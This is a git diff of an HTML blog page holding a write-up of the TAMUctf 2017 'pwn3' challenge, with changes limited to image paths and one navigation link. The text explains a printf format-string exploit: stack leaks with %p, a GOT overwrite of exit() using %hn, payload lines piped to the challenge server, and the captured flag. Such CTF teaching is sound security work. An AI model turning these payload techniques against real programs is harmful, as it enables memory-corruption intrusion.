@@ -81,7 +81,7 @@
                     <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                         
 
-<p><img src="assets/1-pwn3_description.png" alt="Pwn3 challenge description" /></p>
+<p><img src="/assets/1-pwn3_description.png" alt="Pwn3 challenge description" /></p>
 
 <p>Here we are, with another pwning challenge. Let&rsquo;s start :grin:.</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ wget https://ctf.tamu.edu/files/e02cea87728137d5da449db45dcb875e/pwn3
@@ -105,7 +105,7 @@ $ r2 pwn3
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; pdf @ main
 </pre></div>
 
-<p><img src="assets/2-pwn3_main.png" alt="Pwn3 challenge description" /></p>
+<p><img src="/assets/2-pwn3_main.png" alt="Pwn3 challenge description" /></p>
 
 <p>Well, it seems that the execution is pretty straightforward.
 * Using gets function it saves your input in the memory address <strong>local_208h</strong> is pointing to.
@@ -118,11 +118,11 @@ $ r2 pwn3
 
 <p>But, wait a moment, that <strong>printf</strong> call is a bit strange.</p>
 
-<p><img src="assets/3-pwn3_printf_call.png" alt="Pwn3 challenge description" /></p>
+<p><img src="/assets/3-pwn3_printf_call.png" alt="Pwn3 challenge description" /></p>
 
 <p>One push! that is strange because normally <strong>printf</strong> accepts two arguments at least. It should look something like this:</p>
 
-<p><img src="assets/4-pwn3_printf_correct_vs_incorrect_call.png" alt="Pwn3 challenge description" /><br />
+<p><img src="/assets/4-pwn3_printf_correct_vs_incorrect_call.png" alt="Pwn3 challenge description" /><br />
 If the user&rsquo;s input is used as the first argument of <strong>printf</strong>, it means that the input will be interpreted as the format string itself.</p>
 
 <blockquote>
@@ -131,7 +131,7 @@ If the user&rsquo;s input is used as the first argument of <strong>printf</stron
 
 <p>Well, with normals inputs, <strong>printf</strong> will behave &ldquo;corretly&rdquo;, BUT look what happens if you provide format modifiers in your input (<code>input = &quot;%p %p %p %p&quot;</code>):</p>
 
-<p><img src="assets/5-pwn3_printf_leak_memory.png" alt="Pwn3 printf format attack leaking information" /></p>
+<p><img src="/assets/5-pwn3_printf_leak_memory.png" alt="Pwn3 printf format attack leaking information" /></p>
 
 <p><strong>printf</strong> is leaking information of the stack!<br />
 We are being able to see the content of the stack remotely!</p>
@@ -159,7 +159,7 @@ We are being able to see the content of the stack remotely!</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;AAAA&quot; + &quot;%p %p %p %p %p &quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
 </pre></div>
 
-<p><img src="assets/6-pwn3_printf_leak_addr.png" alt="Pwn3 leaking some stack pointers" /></p>
+<p><img src="/assets/6-pwn3_printf_leak_addr.png" alt="Pwn3 leaking some stack pointers" /></p>
 
 <p>Good, it is in the 4^th^ <code>%p</code>. But imagine if the address was in the 300^th^ position. We had to write 300 times <code>%p</code>!
 &gt; What a mess! what then?</p>
@@ -170,7 +170,7 @@ We are being able to see the content of the stack remotely!</p>
 
 <p>Basically using <code>&lt;number&gt;$</code> we are able to select the position of the data we want to select.</p>
 
-<p><img src="assets/7-pwn3_printf_position_arg.png" alt="Pwn3 leaking the exact data" /></p>
+<p><img src="/assets/7-pwn3_printf_position_arg.png" alt="Pwn3 leaking the exact data" /></p>
 
 <blockquote>
 <p>Good! now we know that the address we need to write to is stored in the 4^th^ position. what now?</p>
@@ -189,12 +189,12 @@ For that, we need to know, the specific function (and its address) of the GOT we
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ objdump -R pwn3
 </pre></div>
 
-<p><img src="assets/8-pwn3_objdump.png" alt="Pwn3 GOT table with objdump" /></p>
+<p><img src="/assets/8-pwn3_objdump.png" alt="Pwn3 GOT table with objdump" /></p>
 
 <p>But not all of them are good for us, the function to be replaced must be executed <strong>AFTER</strong> the vulnerable <strong>printf</strong> call.<br />
 Radare2 will give us the answer.</p>
 
-<p><img src="assets/9-pwn3_choosing_GOT_func.png" alt="Pwn3 choosing GOT function" /></p>
+<p><img src="/assets/9-pwn3_choosing_GOT_func.png" alt="Pwn3 choosing GOT function" /></p>
 
 <p>We have a winner! exit() function.</p>
 
@@ -229,13 +229,13 @@ We know <code>%n</code> can write the length of the string with preceeds itself 
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;A&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
 </pre></div>
 
-<p><img src="assets/10-pwn3_broken_pipe.png" alt="Pwn3 broken pipe error" />
+<p><img src="/assets/10-pwn3_broken_pipe.png" alt="Pwn3 broken pipe error" />
 But aparently that is just to much for the pipe.<br />
 We could try the <code>%&lt;times&gt;x</code> parameter. It just print as many memory bytes as we tell it to.</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%x&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
 </pre></div>
 
-<p><img src="assets/11-pwn3_broken_pipe_2.png" alt="Pwn3 broken pipe error 2" />
+<p><img src="/assets/11-pwn3_broken_pipe_2.png" alt="Pwn3 broken pipe error 2" />
 Meh! same result.<br />
 But wait a moment, there is a special paramater <code>%h</code> which does the following:
 &gt; Specifies that a following d, i, o, u, x, or X conversion specifier applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); <strong>or that a following n conversion speciﬁer applies to a pointer to a short int argument</strong>.  &ndash; C is For C Programming - Cask J. Thomson</p></li>
@@ -245,7 +245,7 @@ But wait a moment, there is a special paramater <code>%h</code> which does the f
 We can use it to save our big value in two times. First we will save one half and then the other.<br />
 Let&rsquo;s represent this.</p>
 
-<p><img src="assets/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>
+<p><img src="/assets/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>
 
 <p>Then, it makes sense that the first value to be written should be the lowest one <code>0x804-8 = 2044</code> in the address <code>0804a01e</code> (provided in big endian) which will be stored in the <code>4th</code> position of the stack.</p>
 <div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;addr2&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%____x&quot; + &quot;%_$hn&quot;)&#39;</span>
@@ -260,7 +260,7 @@ Let&rsquo;s represent this.</p>
 <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4323</span>
 </pre></div>
 
-<p><img src="assets/13-pwn3_getting_the_flag.png" alt="Pwn3 Scheme" /></p>
+<p><img src="/assets/13-pwn3_getting_the_flag.png" alt="Pwn3 Scheme" /></p>
 
 <p>Answer: gigem{F0RM@1NG_1S_H4RD}</p>
 
@@ -296,7 +296,7 @@ Let&rsquo;s represent this.</p>
                     </div>  
                 </div>                
                 <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-                    <a href="/post/tamuctf2017/pwn2/">
+                    <a href="/post/tamuctf2017/pwn4/">
                         <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                         <i class="icon ion-android-arrow-back"></i>
                         </button>
